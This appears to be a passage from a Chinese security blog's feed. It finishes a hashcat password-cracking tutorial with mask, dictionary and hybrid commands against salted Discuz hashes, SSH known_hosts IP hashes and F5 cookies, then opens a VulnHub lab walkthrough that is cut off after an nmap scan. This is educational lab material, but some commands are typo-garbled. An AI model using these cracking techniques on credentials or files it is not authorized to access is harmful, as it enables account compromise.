class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  3910 = md5(md5(<span class="variable">$pass</span>).md5(<span class="variable">$salt</span>))</span><br><span class="line"></span><br><span class="line">  4010 = md5(<span class="variable">$salt</span>.md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>))</span><br><span class="line"></span><br><span class="line">  4110 = md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>.<span class="variable">$salt</span>))</span><br><span class="line"></span><br><span class="line">  4210 = md5(<span class="variable">$username</span>.0.<span class="variable">$pass</span>)</span><br><span class="line"></span><br><span class="line">  4300 = md5(strtoupper(md5(<span class="variable">$pass</span>)))</span><br><span class="line"></span><br><span class="line">  4400 = md5(sha1(<span class="variable">$pass</span>))</span><br><span class="line"></span><br><span class="line">  4500 = Double SHA1</span><br><span class="line"></span><br><span class="line">  4600 = sha1(sha1(sha1(<span class="variable">$pass</span>)))</span><br><span class="line"></span><br><span class="line">  4700 = sha1(md5(<span class="variable">$pass</span>))</span><br><span class="line"></span><br><span class="line">  4800 = MD5(Chap), iSCSI CHAP authentication</span><br><span class="line"></span><br><span class="line">  4900 = sha1(<span class="variable">$salt</span>.<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line"></span><br><span class="line">  5000 = SHA-3(Keccak)</span><br><span class="line"></span><br><span class="line">  5100 = Half MD5</span><br><span class="line"></span><br><span class="line">  5200 = Password Safe SHA-256</span><br><span class="line"></span><br><span class="line">  5300 = IKE-PSK MD5</span><br><span class="line"></span><br><span class="line">  5400 = IKE-PSK SHA1</span><br><span class="line"></span><br><span class="line">  5500 = NetNTLMv1-VANILLA / NetNTLMv1-ESS</span><br><span class="line"></span><br><span class="line">  5600 = NetNTLMv2</span><br><span class="line"></span><br><span class="line">  5700 = Cisco-IOS SHA256</span><br><span class="line"></span><br><span class="line">  5800 = Android PIN</span><br><span class="line"></span><br><span class="line">  6300 = AIX &#123;smd5&#125;</span><br><span class="line"></span><br><span class="line">  6400 = AIX &#123;ssha256&#125;</span><br><span class="line"></span><br><span class="line">  6500 = AIX &#123;ssha512&#125;</span><br><span class="line"></span><br><span class="line">  6700 = AIX &#123;ssha1&#125;</span><br><span class="line"></span><br><span class="line">  6900 = GOST, GOST R 34.11-94</span><br><span class="line"></span><br><span class="line">  7000 = Fortigate (FortiOS)</span><br><span class="line"></span><br><span class="line">  7100 = OS X v10.8+</span><br><span class="line"></span><br><span class="line">  7200 = GRUB 2</span><br><span class="line"></span><br><span class="line">  7300 = IPMI2 RAKP HMAC-SHA1</span><br><span class="line"></span><br><span class="line">  7400 = sha256crypt, SHA256(Unix)</span><br><span class="line"></span><br><span class="line">  7900 = Drupal7</span><br><span class="line"></span><br><span class="line">  8400 = WBB3, Woltlab Burning Board 3</span><br><span class="line"></span><br><span class="line">  8900 = scrypt</span><br><span class="line"></span><br><span class="line">  9200 = Cisco <span class="variable">$8</span>$</span><br><span class="line"></span><br><span class="line">  9300 = Cisco <span class="variable">$9</span>$</span><br><span class="line"></span><br><span class="line">  9800 = Radmin2</span><br><span class="line"></span><br><span class="line"> 10000 = Django (PBKDF2-SHA256)</span><br><span class="line"></span><br><span class="line"> 10200 = Cram MD5</span><br><span class="line"></span><br><span class="line"> 10300 = SAP CODVN H (PWDSALTEDHASH) iSSHA-1</span><br><span class="line"></span><br><span class="line"> 11000 = PrestaShop</span><br><span class="line"></span><br><span class="line"> 11100 = PostgreSQL Challenge-ResponseAuthentication (MD5)</span><br><span class="line"></span><br><span class="line"> 11200 = MySQL Challenge-Response Authentication(SHA1)</span><br><span class="line"></span><br><span class="line"> 11400 = SIP digest authentication (MD5)</span><br><span class="line"></span><br><span class="line"> 99999 = Plaintext</span><br><span class="line"></span><br><span class="line">特殊哈希类型</span><br><span class="line"></span><br><span class="line">   11 = Joomla &lt; 2.5.18</span><br><span class="line"></span><br><span class="line">   12 = PostgreSQL</span><br><span class="line"></span><br><span class="line">   21 = osCommerce, xt:Commerce</span><br><span class="line"></span><br><span class="line">   23 = Skype</span><br><span class="line"></span><br><span class="line">  101 = nsldap, SHA-1(Base64), Netscape LDAPSHA</span><br><span class="line"></span><br><span class="line">  111 = nsldaps, SSHA-1(Base64), Netscape LDAPSSHA</span><br><span class="line"></span><br><span class="line">  112 = Oracle S: Type (Oracle 11+)</span><br><span class="line"></span><br><span class="line">  121 = SMF &gt; v1.1</span><br><span class="line"></span><br><span class="line">  122 = OS X v10.4, v10.5, v10.6</span><br><span class="line"></span><br><span class="line">  123 = EPi</span><br><span class="line"></span><br><span class="line">  124 = Django (SHA-1)</span><br><span class="line"></span><br><span class="line">  131 = MSSQL(2000)</span><br><span class="line"></span><br><span class="line">  132 = MSSQL(2005)</span><br><span class="line"></span><br><span class="line">  133 = PeopleSoft</span><br><span class="line"></span><br><span class="line">  141 = EPiServer 6.x &lt; v4</span><br><span class="line"></span><br><span class="line"> 1421 = hMailServer</span><br><span class="line"></span><br><span class="line"> 1441 = EPiServer 6.x &gt; v4</span><br><span class="line"></span><br><span class="line"> 1711 = SSHA-512(Base64), LDAP &#123;SSHA512&#125;</span><br><span class="line"></span><br><span class="line"> 1722 = OS X v10.7</span><br><span class="line"></span><br><span class="line"> 1731 = MSSQL(2012 &amp; 2014)</span><br><span class="line"></span><br><span class="line"> 2611 = vBulletin &lt; v3.8.5</span><br><span class="line"></span><br><span class="line"> 2612 = PHPS</span><br><span class="line"></span><br><span class="line"> 2711 = vBulletin &gt; v3.8.5</span><br><span class="line"></span><br><span class="line"> 2811 = IPB2+, MyBB1.2+</span><br><span class="line"></span><br><span class="line"> 3711 = Mediawiki B <span class="built_in">type</span></span><br><span class="line"></span><br><span class="line"> 3721 = WebEdition CMS</span><br><span class="line"></span><br><span class="line"> 7600 = Redmine Project Management Web App</span><br></pre></td></tr></table></figure>

<h3 id="第四步：hashcat破解密码规则示例"><a href="#第四步：hashcat破解密码规则示例" class="headerlink" title="第四步：hashcat破解密码规则示例"></a>第四步：hashcat破解密码规则示例</h3><p>(1)字典攻击</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-a 0 password.lst</span><br></pre></td></tr></table></figure>

<p>(2)1到8为数字掩码攻击</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-a 3 --increment --increment-min 1--increment-max 8 ?d?d?d?d?d?d?d?d –O</span><br></pre></td></tr></table></figure>
<p>?d代表数字，可以换成小写字母?l，大写字母?u，特殊字符?s，大小写字母+特殊字符?a，–O表示最优化破解模式，可以加该参数，也可以不加该参数。</p>
<p>(3)8为数字攻击</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-a 3 ?d?d?d?d?d?d?d?d </span><br></pre></td></tr></table></figure>
<p>同理可以根据位数设置为字母大写、小写、特殊字符等模式。</p>
<p>(4)自定义字符<br>现在纯数字或者纯字母的密码是比较少见的，根据密码专家对泄漏密码的分析，90%的个人密码是字母和数字的组合，可以是自定义字符了来进行暴力破解，Hashcat支持4个自定义字符集，分别是 -1 -2 -3 -4。定义时只需要这样-2  ?l?d ，然后就可以在后面指定?2，?2表示小写字母和数字。这时候要破解一个8位混合的小写字母加数字：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat.exe -a 3 –force -2 ?l?d  hassh值或者<span class="built_in">hash</span>文件  ?2?2?2?2?2?2?2?2</span><br></pre></td></tr></table></figure>
<p>例如破解dz小写字母+数字混合8位密码破解：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat -m 2611  -a 3 -2 ?l?d  dz.hash    ?2?2?2?2?2?2?2?2</span><br></pre></td></tr></table></figure>

<p>(5)字典+掩码暴力破解<br>Hashcat还支持一种字典加暴力的破解方法，就是在字典前后再加上暴力的字符序列，比如在字典后面加上3为数字，这种密码是很常见的。使用第六种攻击模式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a-6 (Hybrid dict + mask)</span><br></pre></td></tr></table></figure>
<p>如果是在字典前面加则使用第7中攻击模式也即( a-7 = Hybridmask + dict)，下面对字典文件加数字123进行破解：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">H.exe -a 6 ffe1cb31eb084cd7a8dd1228c23617c8  password.lst ?d?d?d</span><br></pre></td></tr></table></figure>
<p>假如ffe1cb31eb084cd7a8dd1228c23617c8的密码为password123，则只要password.lst包含123即可</p>
<p>(6)掩码+字典暴力破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">H.exe -a 7  ffe1cb31eb084cd7a8dd1228c23617c8  password.lst ?d?d?d</span><br></pre></td></tr></table></figure>
<p>假如ffe1cb31eb084cd7a8dd1228c23617c8的密码为123password，则只要password.lst包含password即可。</p>
<p>(7)大小写转换攻击，对password.lst中的单词进行大小写转换攻击</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">H.exe<span class="_">-a</span> 2  ffe1cb31eb084cd7a8dd1228c23617c8  password.lst</span><br></pre></td></tr></table></figure>

<h4 id="EXAMPLES"><a href="#EXAMPLES" class="headerlink" title="EXAMPLES"></a>EXAMPLES</h4><p>(1)8位数字破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64-m 9700 <span class="built_in">hash</span> -a 3 ?d?d?d?d?d?d?d?d -w 3 –O</span><br></pre></td></tr></table></figure>
<p>(2)1-8位数字破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat-m 9700 <span class="built_in">hash</span> -a 3 --increment --increment-min 1--increment-max 8 ?d?d?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>
<p>(3)1到8位小写字母破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat-m 9700 <span class="built_in">hash</span> -a 3 --increment --increment-min 1--increment-max 8 ?l?l?l?l?l?l?l?l</span><br></pre></td></tr></table></figure>
<p>(4)8位小写字母破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat-m 9700 <span class="built_in">hash</span> -a 3 ?l?l?l?l?l?l?l?l -w 3 –O</span><br></pre></td></tr></table></figure>
<p>(5)1-8位大写字母破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat-m 9700 <span class="built_in">hash</span> -a 3 --increment --increment-min 1--increment-max 8 ?u?u?u?u?u?u?u?u</span><br></pre></td></tr></table></figure>
<p>(6)8位大写字母破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat-m 9700 <span class="built_in">hash</span> -a 3 ?u?u?u?u?u?u?u?u -w 3 –O</span><br></pre></td></tr></table></figure>
<p>(7)5位小写+ 大写+数字+特殊字符破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat-m 9700 <span class="built_in">hash</span> -a 3 ?b?b?b?b?b -w 3</span><br></pre></td></tr></table></figure>
<p>(8)使用字典进行破解<br>使用password.lst字典进行暴力破解，-w 3参数是指定电力消耗</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat  -m 9700 -a 0 -w 3 <span class="built_in">hash</span>  password.lst</span><br></pre></td></tr></table></figure>

<p><font color="blue">在执行破解成功后，hashcat会自动终止破解，并显示破解状态为Cracked，Recvoered中也会显示是否破解成功.</font></p>
<h3 id="破解known-hosts中的IP地址"><a href="#破解known-hosts中的IP地址" class="headerlink" title="破解known_hosts中的IP地址"></a>破解known_hosts中的IP地址</h3><p>经过研究发现known_hosts中会对连接的IP地址进行HMAC SHA1加密，可以通过hexhosts攻击进行转换，然后通过hashcat进行暴力破解，其密码类型为160（HMAC-SHA1 (key = $salt)）。</p>
<p>(1)计算HMAC SHA1值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gitclone https://github.com/persona5/hexhosts.git</span><br><span class="line">cdhexhosts</span><br><span class="line">gcchexhosts.c -lresolv -w -o hexhosts</span><br><span class="line">./hexhosts</span><br></pre></td></tr></table></figure>
<p>获取known_hosts的HMAC SHA1加密值：</p>
<p>注意：known_hosts值一定要正确，可以将known_hosts文件复制到hexhosts文件目录。</p>
<p>(2)组合攻击暴力破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat<span class="_">-a</span> 1 -m 160 known_hosts.hash ips_left.txt ips_right.txt --hex-salt</span><br></pre></td></tr></table></figure>
<p>组合攻击是将ips_left.txt和ips_right.txt进行组合，形成完整的IP地址进行暴力破解。</p>
<p>ips_left.txt和ips_right.txt文件可以用以下代码进行生成：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip-gen.sh：</span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> `seq 0 255`</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> b <span class="keyword">in</span> `seq0 255`</span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span><span class="string">&quot;<span class="variable">$a</span>.<span class="variable">$b</span>.&quot;</span> &gt;&gt; ips_left.txt</span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span><span class="string">&quot;<span class="variable">$a</span>.<span class="variable">$b</span>&quot;</span> &gt;&gt; ips_right.txt</span><br><span class="line"></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>(3)使用掩码进行攻击</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat  -a 3 -m 160 known_hosts.hash ipv4.hcmask--hex-salt</span><br></pre></td></tr></table></figure>
<p>ipv4.hcmask文件内容可在<span class="exturl" data-url="aHR0cHM6Ly9wYXN0ZWJpbi5jb20vNEhRNkM4Z0c=">此站<i class="fa fa-external-link-alt"></i></span>下载。</p>
<h3 id="破解md5加密的IP地址"><a href="#破解md5加密的IP地址" class="headerlink" title="破解md5加密的IP地址"></a>破解md5加密的IP地址</h3><p>在CDN等网络或者配置中往往会对IP地址进行MD5加密，由于其位数3×4+3（xxx.xxx.xxx.xxx）=17位，通过正常的密码破解其时间耗费非常长，但通过分析其IP地址的规律，发现其地址XXX均为数字，因此可以通过hashcat的组合和掩码进行攻击。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat<span class="_">-a</span> 1 –m 0 ip.md5.txt ips_left.txt ips_right.txt </span><br><span class="line"></span><br><span class="line">hashcat  -a1 -m 0 ip.md5.txt ipv4.hcmask</span><br></pre></td></tr></table></figure>
<p>另外在F5的cookie中会对其IP地址进行加密，可以参考的破解代码如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line"></span><br><span class="line">cookie = <span class="string">&quot;1005421066.20736.0000&quot;</span></span><br><span class="line"></span><br><span class="line">(ip,port,end)=cookie.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">(a,b,c,d)=[ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> struct.pack(<span class="string">&quot;i&quot;</span>,int(ip))]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Decoded IP: %s %s %s %s&quot;</span> % (a,b,c,d)</span><br><span class="line"></span><br><span class="line">Decoded IP: 10.130.237.59</span><br></pre></td></tr></table></figure>

<h4 id="破解技巧总结"><a href="#破解技巧总结" class="headerlink" title="破解技巧总结"></a>破解技巧总结</h4><p>在使用GPU模式进行破解时，可以使用-O参数自动进行优化</p>
<h3 id="暴力破解一条md5值"><a href="#暴力破解一条md5值" class="headerlink" title="暴力破解一条md5值"></a>暴力破解一条md5值</h3><p>(1)9位数字破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force d98d28ca88f9966cb3aaefebbfc8196f ?d?d?d?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>
<p>单独破解一条md5值需要加force参数</p>
<p>(2)9位字母破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force d98d28ca88f9966cb3aaefebbfc8196f ?l?l?l?l?l?l?l?l?l</span><br></pre></td></tr></table></figure>

<h3 id="破解带盐discuz密码"><a href="#破解带盐discuz密码" class="headerlink" title="破解带盐discuz密码"></a>破解带盐discuz密码</h3><p>(1)数字破解<br>7位数字，7秒时间破解完成任务。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 ffe1cb31eb084cd7a8dd1228c23617c8:f56463 ?d?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>
<p>8位数字破解，9秒时间破解完成任务。：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 ffe1cb31eb084cd7a8dd1228c23617c8:f56463 ?d?d?d?d?d?d?d?d </span><br></pre></td></tr></table></figure>
<p>9位数字破解，9秒时间破解完成任务。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 ffe1cb31eb084cd7a8dd1228c23617c8:f56463 ?d?d?d?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>

<h3 id="字母破解"><a href="#字母破解" class="headerlink" title="字母破解"></a>字母破解</h3><p>(1)6位小写字母</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 ffe1cb31eb084cd7a8dd1228c23617c8:f56463 ?l?l?l?l?l?l </span><br></pre></td></tr></table></figure>
<p>(2)7位小写字母</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 ffe1cb31eb084cd7a8dd1228c23617c8:f56463 ?l?l?l?l?l?l?l </span><br></pre></td></tr></table></figure>
<p>(3)8位小写字母</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 ffe1cb31eb084cd7a8dd1228c23617c8:f56463 ?l?l?l?l?l?l?l?l 9分钟左右完成破解任务</span><br></pre></td></tr></table></figure>
<p>(4)9位小写字母</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 ffe1cb31eb084cd7a8dd1228c23617c8:f56463 ?l?l?l?l?l?l?l?l?l -O</span><br></pre></td></tr></table></figure>

<h3 id="字母加数字"><a href="#字母加数字" class="headerlink" title="字母加数字"></a>字母加数字</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 -2 ?d?l ffe1cb31eb084cd7a8dd1228c23617c8:f56463?2?2?2?2?2?2?2</span><br></pre></td></tr></table></figure>
<p>(3)7位大写字母</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 –force –m 2611 ffe1cb31eb084cd7a8dd1228c23617c8:f56463 ?u?u?u?u?u?u?u</span><br></pre></td></tr></table></figure>
<p>(4)6到8位数字破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 –force –m 2611 ffe1cb31eb084cd7a8dd1228c23617c8:f56463--increment --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l </span><br></pre></td></tr></table></figure>

<h3 id="自定义破解"><a href="#自定义破解" class="headerlink" title="自定义破解"></a>自定义破解</h3><p>(1)使用数字加字母混合6位进行破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 -2 ?d?l ffe1cb31eb084cd7a8dd1228c23617c8:f56463?2?2?2?2?2?2 -O</span><br></pre></td></tr></table></figure>
<p>(2)使用数字加字母混合7位进行破解，破解时间4分16秒</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 -2 ?d?l ffe1cb31eb084cd7a8dd1228c23617c8:f56463?2?2?2?2?2?2?2 –O</span><br></pre></td></tr></table></figure>
<p>(3)使用数字加字母混合8位进行破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 -2 ?d?l ffe1cb31eb084cd7a8dd1228c23617c8:f56463?2?2?2?2?2?2?2?2 -O</span><br></pre></td></tr></table></figure>

<h3 id="字典破解模式"><a href="#字典破解模式" class="headerlink" title="字典破解模式"></a>字典破解模式</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 0 --force -m 2611 ffe1cb31eb084cd7a8dd1228c23617c8:f56463 password.lst</span><br></pre></td></tr></table></figure>
<p>使用字典文件夹下的字典进行破解:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat32.exe-m 300 mysqlhashes.txt –remove -o mysql-cracked.txt ..\dictionaries\*</span><br></pre></td></tr></table></figure>

<h3 id="会话保存及恢复破解"><a href="#会话保存及恢复破解" class="headerlink" title="会话保存及恢复破解"></a>会话保存及恢复破解</h3><p>(1)使用mask文件规则来破解密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat-m 2611 -a 3 --session mydz dz.hash masks/rockyou-7-2592000.hcmask</span><br></pre></td></tr></table></figure>
<p>(2)恢复会话</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat--session mydz --restore</span><br></pre></td></tr></table></figure>

<h3 id="掩码破解"><a href="#掩码破解" class="headerlink" title="掩码破解"></a>掩码破解</h3><p>mask规则文件位于masks下，例如D:\PentestBox\hashcat-4.1.0\masks，执行破解设置为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">masks/8char-1l-1u-1d-1s-compliant.hcmask</span><br><span class="line">masks/8char-1l-1u-1d-1s-noncompliant.hcmask</span><br><span class="line">masks/rockyou-1-60.hcmask</span><br><span class="line">masks/rockyou-2-1800.hcmask</span><br><span class="line">masks/rockyou-3-3600.hcmask</span><br><span class="line">masks/rockyou-4-43200.hcmask</span><br><span class="line">masks/rockyou-5-86400.hcmask</span><br><span class="line">masks/rockyou-6-864000.hcmask</span><br><span class="line">masks/rockyou-7-2592000.hcmask</span><br></pre></td></tr></table></figure>
<p>运用规则文件进行破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat -m 300 mysqlhashes.txt–remove -o mysql-cracked.txt ..\dictionaries\* -r rules\best64.rule</span><br><span class="line"></span><br><span class="line">hashcat -m 2611 -a 0 dz.hashpassword.lst  -r rules\best64.rule  -O</span><br></pre></td></tr></table></figure>

<h4 id="hashcat参数优化"><a href="#hashcat参数优化" class="headerlink" title="hashcat参数优化"></a>hashcat参数优化</h4><p><font color="blue">考虑到hashcat的破解速度以及资源的分配，我们可以对一些参数进行配置<br>1.Workload tuning 负载调优。<br>该参数支持的值有1,8,40,80,160</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--gpu-accel 160 可以让GPU发挥最大性能。</span><br></pre></td></tr></table></figure>

<p>2.Gpu loops 负载微调<br>该参数支持的值的范围是8-1024（有些算法只支持到1000）。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--gpu-loops 1024 可以让GPU发挥最大性能。</span><br></pre></td></tr></table></figure>

<p>3.Segment size 字典缓存大小<br>该参数是设置内存缓存的大小，作用是将字典放入内存缓存以加快字典破解速度，默认为32MB，可以根据自身内存情况进行设置，当然是越大越块了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--segment-size 512 可以提高大字典破解的速度。</span><br></pre></td></tr></table></figure>
</font>

<h4 id="LAST-密码设置建议"><a href="#LAST-密码设置建议" class="headerlink" title="LAST:密码设置建议"></a>LAST:密码设置建议</h4><font color="red">
使用更长的字符串

<p>使用更大的字符集字母、数字、符号</p>
<p>不要使用任何可能与你有关的字符作为密码或密码的一部分使用<br></font></p>
]]></content>
      <categories>
        <category>密码破解</category>
      </categories>
      <tags>
        <tag>hashcat</tag>
        <tag>gpu</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Lord-Of-The-Root-1-0-1]</title>
    <url>/2020/01/24/Lord-Of-The-Root-1-0-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：Lord Of The Root: 1.0.1<br>发行日期：2015年9月23日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cDovL3d3dy5tZWRpYWZpcmUuY29tL2Rvd25sb2FkL201dGJ4MGR1YTA1c3pqbS9Mb3JkT2ZUaGVSb290Lm92YQ==">http://www.mediafire.com/download/m5tbx0dua05szjm/LordOfTheRoot.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9sb3Jkb2Z0aGVyb290L0xvcmRPZlRoZVJvb3RfMS4wLjEub3Zh">https://download.vulnhub.com/lordoftheroot/LordOfTheRoot_1.0.1.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9sb3Jkb2Z0aGVyb290L0xvcmRPZlRoZVJvb3RfMS4wLjEub3ZhLnRvcnJlbnQ=">https://download.vulnhub.com/lordoftheroot/LordOfTheRoot_1.0.1.ova.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>创建这台机器是为了帮助其他人学习一些基本的CTF hack技巧和一些工具。这台机器的难度与我在OSCP上遇到的难度非常相似。这是一个引导到root的靶机，不需要任何来宾交互。有两种设计的权限提升方法。</p>
<ul>
<li>23/09/2015 == v1.0.1</li>
<li>22/09/2015 == v1.0</li>
</ul>
<a id="more"></a>

<p>如果您在使用VirtualBox时遇到问题，请尝试以下操作：</p>
<ul>
<li>下载LordOfTheRoot_1.0.1.ova（确认文件哈希）</li>
<li>下载并安装了VMWare ovftool。</li>
<li>使用ovftool将OVA转换为OVF。</li>
<li>使用文本编辑器修改了OVF，并执行以下操作：将所有对“ElementName”的引用替换为“标题”，将对“vmware.sata.ahci”的单个引用替换为“AHCI”</li>
<li>保存了OVF。+删除.mf（清单）文件。如果不这样做，则在导入时会出现错误，说SHA与OVF不匹配（尝试过修改哈希，但没有成功）。</li>
<li>尝试导入OVF文件，应该可以正常工作。</li>
</ul>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.113</span><br><span class="line">Host is up (0.00022s latency).</span><br><span class="line">MAC Address: 08:00:27:0B:D4:69 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)</span><br></pre></td></tr></table></figure>

<p>连接一下ssh试试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh 192.168.56.113</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.56.113 (192.168.56.113)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.56.113<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                                  .____    _____________________________</span></span><br><span class="line"><span class="string">                                                  |    |   \_____  \__    ___/\______   \</span></span><br><span class="line"><span class="string">                                                  |    |    /   |   \|    |    |       _/</span></span><br><span class="line"><span class="string">                                                  |    |___/    |    \    |    |    |   \</span></span><br><span class="line"><span class="string">                                                  |_______ \_______  /____|    |____|_  /</span></span><br><span class="line"><span class="string">                                                          \/       \/                 \/</span></span><br><span class="line"><span class="string"> ____  __.                     __     ___________      .__                   .___ ___________      ___________       __</span></span><br><span class="line"><span class="string">|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________</span></span><br><span class="line"><span class="string">|      &lt;  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \</span></span><br><span class="line"><span class="string">|    |  \|   |  (  &lt;_&gt; )  \___|    &lt;   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  &lt;_&gt; )  |        \   |  \  | \  ___/|  | \/</span></span><br><span class="line"><span class="string">|____|__ \___|  /\____/ \___  &gt;__|_ \  \___  /   |__|  |__|\___  &gt;___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  &gt;__|</span></span><br><span class="line"><span class="string">        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          